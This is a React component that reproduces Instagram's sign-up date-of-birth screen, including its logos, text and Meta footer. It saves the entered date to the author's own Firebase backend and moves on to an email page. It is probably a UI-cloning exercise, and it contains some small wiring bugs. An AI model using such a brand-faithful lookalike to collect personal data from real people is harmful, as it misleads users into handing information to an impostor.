
import React,{useState,useEffect} from "react";
import { useNavigate } from "react-router-dom";
  import { useFirebase } from "./Firebase";
  import micro from "./imgs/micro.png"
  import auth from "./imgs/auth.png"
import play from "./imgs/play.png"
import ss1 from "./imgs/screenshot1.png"
import allimg from "./imgs/allimg.png"
import ss2 from "./imgs/screenshot2.png"
import ss3 from "./imgs/screenshot3.png"
import ss4 from "./imgs/screenshot4.png"

export default function BirthPage() {
  const navigate = useNavigate();
  const firebase = useFirebase();
  const [years, setYears] = useState([]);
  const [days, setDays] = useState([]);
  const [month, setMonth] = useState(1);
  const [year, setYear] = useState(new Date().getFullYear());

  const [dob, setDob] = useState({ day: 1, month: 1, year: new Date().getFullYear() });

  const handleSubmit = async (e) => {
    e.preventDefault();
const maindob= `${dob.day}-${dob.month}-${dob.year}`;
    // Print the selected date of birth
    console.log(`Date of Birth: ${dob.day}-${dob.month}-${dob.year}`);
    console.log(maindob)
await firebase.savedob(maindob)
    try {
      navigate("/EmailPage");
    } catch (err) {
      alert("Error: Something Went Wrong");
    }
  };

  const [Moveimg,setMoveimg]=useState(ss1);
  const [Indx,setIndx]=useState(0);
  const Imges=[ss1,ss2,ss3,ss4];

useEffect(()=>{



  const interval=setInterval(()=>{
    setMoveimg(Imges[Indx]);
    if(Indx===3){setIndx(0)}else{setIndx(Indx+1)}
    // console.log(Indx)
  },3000)


  return ()=>clearInterval(interval);
},[Indx]);

  // Populate years from 1919 to current year
  useEffect(() => {
    const currentYear = new Date().getFullYear();
    const yearOptions = [];
    for (let i = 1919; i <= currentYear; i++) {
      yearOptions.push(i);
    }
    setYears(yearOptions);
  }, []);

  // Populate days based on selected month and year
  useEffect(() => {
    const daysInMonth = new Date(year, month, 0).getDate();
    const dayOptions = [];
    for (let i = 1; i <= daysInMonth; i++) {
      dayOptions.push(i);
    }
    setDays(dayOptions);
  }, [month, year]);
  const handleDayChange = (e) => {
    setDob({ ...dob, day: Number(e.target.value) });
  };

  const handleMonthChange = (e) => {
    setMonth(Number(e.target.value));
    setDob({ ...dob, month: Number(e.target.value) });
  };

  const handleYearChange = (e) => {
    setYear(Number(e.target.value));
    setDob({ ...dob, year: Number(e.target.value) });
  };
  return (
    <>
      <div
        className="Main_container bg- w-100 h-100 d-flex align-items-center justify-content-center"
        style={{ height: "663.98px" }}
      >
        <div
          className="Second_main bg- d-flex "
         
        >
          <div className=" col first w-100 bg-  " style={{position:"relative"}}>
            <img src={auth} className="mt-3" />
          <div className="text-center w-100" style={{position:"absolute",top:"0px",right:"-50px",marginTop:'-7px'}} >

          <img src={Moveimg} alt="Move_img" className="mt-5"/>

          </div>

          </div>
          <div
            className=" col Second w-100 bg- "
            
          >
            {/* login */}
            <div

              className="Login_dataaa bg- p-4 d-flex align-items-center justify-content-center flex-column gap-2 "
            
            >
             <span  style={{  backgroundRepeat:"no-repeat",backgroundPosition:"0 0",height:"96px",width:"144px",overflow:"hidden" }}> <img
                src={allimg}
                alt="Insta_logo"
               
              /></span>
              <span className="w-100 text-center px-5" style={{color:"#000",fontSize:"16px",fontWeight:"600"}}>Add your date of birth</span>
              <span className="d-flex flex-column text-center">
             <span style={{color:"black",fontSize:"14px"}}>This won't be part of your public profile.</span>
                <span  style={{fontSize:"14px",color:"#0095f6"}}>Why do I need to provide my date of birth?</span>
              </span>
              
                <form onSubmit={handleSubmit} className="d-flex align-items-center flex-column justify-content-center" >

                  <div className="d-flex gap-2 ">
                    <select
                      style={{border:"1px solid #ccd0d5",borderRadius:"4px",padding:"7px",outline:"none",fontSize:"12px",color:"#737373"}}
                      id="month"
                      value={month}
                      onChange={handleDayChange}
                    >
                      <option value="1">January</option>
                      <option value="2">February</option>
                      <option value="3">March</option>
                      <option value="4">April</option>
                      <option value="5">May</option>
                      <option value="6">June</option>
                      <option value="7">July</option>
                      <option value="8">August</option>
                      <option value="9">September</option>
                      <option value="10">October</option>
                      <option value="11">November</option>
                      <option value="12">December</option>
                    </select>

                    {/* Day Selector */}

                    <select
                      style={{border:"1px solid #ccd0d5",borderRadius:"4px",padding:"7px",outline:"none",fontSize:"12px",color:"#737373"}}
                      id="day"
                      value={dob.day}
                onChange={handleDayChange}
                      >
                      {days.map((day) => (
                        <option key={day} value={day}>
                          {day}
                        </option>
                      ))}
                    </select>

                    {/* Year allimg Selector */}

                    <select
                      style={{border:"1px solid #ccd0d5",borderRadius:"4px",padding:"7px",outline:"none",fontSize:"12px",color:"#737373"}}
                      
                      id="year"
                      value={year}
                onChange={handleYearChange}
                    >
                      {years.map((year) => (
                        <option key={year} value={year}>
                          {year}
                        </option>
                      ))}
                    </select>

                    </div>
<span style={{color:"#737373",fontSize:"12px"}} className="mt-2">You need to enter the date you were born on</span>
<span  className="text-center mt-3" style={{color:"#737373",fontSize:"12px"}}>Use your own date of birth, even if this account is for a business, pet or something else</span>

              <button 
                type="submit"
                className=" btn text-white d-flex align-items-center mt-3 justify-content-center"
                style={{ width: "268px", height: "32px",fontWeight:"600",borderRadius:"7px",background:"#0095f6" }}
              >
               Next
              </button>
                  <button className="" style={{color:"#0095f6",border:"none",background:"none"}}> Go back</button>

</form>


              </div>


            <div
              
              className=" mt-2 d-flex align-items-center justify-content-center Login_border"
            >
              <span>Don't have a account? </span>
              <button className="fw-bold ms-1" 
                style={{border:"none",color: "#0095f6",background:"none"}}
                onClick={() => navigate("/")}>

                Log in
              </button>
            </div>
            <div
              className="d-flex mt-3 align-items-center justify-content-center"
              style={{ width: "350px" }}
            >
              <span style={{ color: "#000000", fontSize: "14px" }}>
                Get the app.
              </span>
            </div>
            <div
              className="Play_store_logo d-flex justify-content-center gap-2 mt-3"
              style={{ width: "350px", height: "44px" }}
            >
              <img src={play} alt="playstore_img" />
              <img src={micro} alt="microsoft_img" />
            </div>
          </div>
        </div>
        </div>

      {/* footer data */}
      <div className="w-100 mt-5 d-flex flex-column align-items-center justify-content-center flex-column">
        <div
          className="fotter_data  d-flex align-items-center gap-4 justify-content-center"
          style={{ maxWidth: "1066px", flexWrap:"wrap" }}
        >
          <a style={{ color: "#737373", fontSize: "12px" }}>Meta</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>About</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>Blog</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>Jobs</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>Help</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>Api</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>Privacy</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>Term</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>Locations</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>Instagram Lite</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>Threads</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>
            Contact uploading and non-users
          </a>
          <a style={{ color: "#737373", fontSize: "12px" }}>Meta Verified</a>
        </div>
        <div
          className="fotter_data col mt-3  d-flex align-items-center gap-4 justify-content-center"
          style={{
            maxWidth: "1066px",
            color: "#737373",
            fontSize: "13px",
            marginBottom: "60px",
          }}
        >
          <span>English (UK)</span>
          <span>© 2024 Instagram from Meta</span>
        </div>
      </div>
    </>
  );
}
